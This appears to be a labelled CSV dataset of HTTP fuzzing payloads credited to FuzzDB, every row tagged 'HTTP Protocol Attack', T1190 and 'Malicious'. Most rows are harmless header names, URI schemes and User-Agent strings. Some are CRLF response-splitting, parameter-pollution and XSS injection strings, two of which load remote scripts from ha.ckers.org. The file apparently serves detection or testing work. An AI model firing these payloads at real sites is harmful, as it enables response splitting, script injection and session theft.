?id[]=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%c0%a6id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
im:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wss:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cvs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1\uc0a6id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
javascript:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%2526id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_OUT_DATA,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dns:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
GET,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cache-Control,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
data:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lsid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
apt:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rtmp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pop:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
imap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CHECKOUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
paparazzi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Public-Key-Pins,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&amp;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-WebKit-CSP,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soap.beeps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Language,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gizmoproject:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
????id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Ranges,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
message:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1#id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc6:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BDELETE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-None-Match,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Strict-Transport-Security,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ut2004:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
platform:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dav:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
beshare:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/2.0 (compatible; MSIE 3.02; Update a; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
teamspeak:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Retry-After,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
about:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmpp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ACL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tip:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id===1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.14) Gecko/20080520 Firefox/2.0.0.14,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bitcoin:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
crid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
content:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Pragma,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sieve:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rsync:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
skype:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wtai:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msnim:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BASELINE-CONTROL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
INDEX,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
adiumxtra:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gtalk:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bolo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rmi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soldat:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Frame-Options,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
vemmi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Allow,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sip:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ETag,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
h323:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DNT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Access-Control-Allow-Origin,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Proto,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKACTIVITY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Via,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Wget/1.8.2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
\r\n,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
P3P,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Last-Modified,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Front-End-Https,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
telnet:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
VERSION-CONTROL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iax:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Length,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNCHECKOUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Host,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
service:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Transfer-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
chrome:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
doi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
palm:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Authorization,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ventrilo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
webcal:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SEARCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Connection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNLOCK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DEBUG,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authenticate,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mtqp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
coap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wyciwyg:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%u0026;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpcs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fish:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.lws:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wais:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Modified-Since,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[1&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
info:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0A,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beeps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
callto:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tel:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
finger:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
steam:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
itms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
spotify:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id%3D2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mvn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.7) Gecko/20070606,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id['&id=1']=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKWORKSPACE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Http-Method-Override,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ipp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
market:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&&&&id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ircs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Upgrade,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ed2k:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
proxy:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
thismessage:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Match,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0%0d%0ad%0%0d%0aa,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaa:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Powered-By,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cookie,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Datetime,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNSUBSCRIBE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BPROPPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id==1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pres:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
smb:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Vary,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
geo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Status,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mumble:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPFIND,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
From,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
uuid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nfs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Type,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ymsgr:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Warning,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
icap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ORDERPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%5cr%5cn,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fax:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Trailer,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mupdate:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0d%0a%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729) JBroFuzz/1.4,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
opaquelocktoken:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
WWW-Authenticate,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xri:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ssh:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[=1&id=2]=3,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Language,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id;id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1?id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
z39.50r:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dict:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
z39.50s:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=id['1']=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
REPORT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aw:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
svn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
udp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Set-Cookie,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
feed:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gg:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
LOCK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-MS-ENUMATTS,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id&id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Disposition,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0D0x0A0x0A,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=/:@&=+$&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
afp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Connection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
view-source:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
things:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.beep:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mailto:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rtsp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sgn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
http:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nntp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
notes:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POST,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
https:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
prospero:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
git:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Security-Policy,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BCOPY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
keyparc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soap.beep:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POLL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
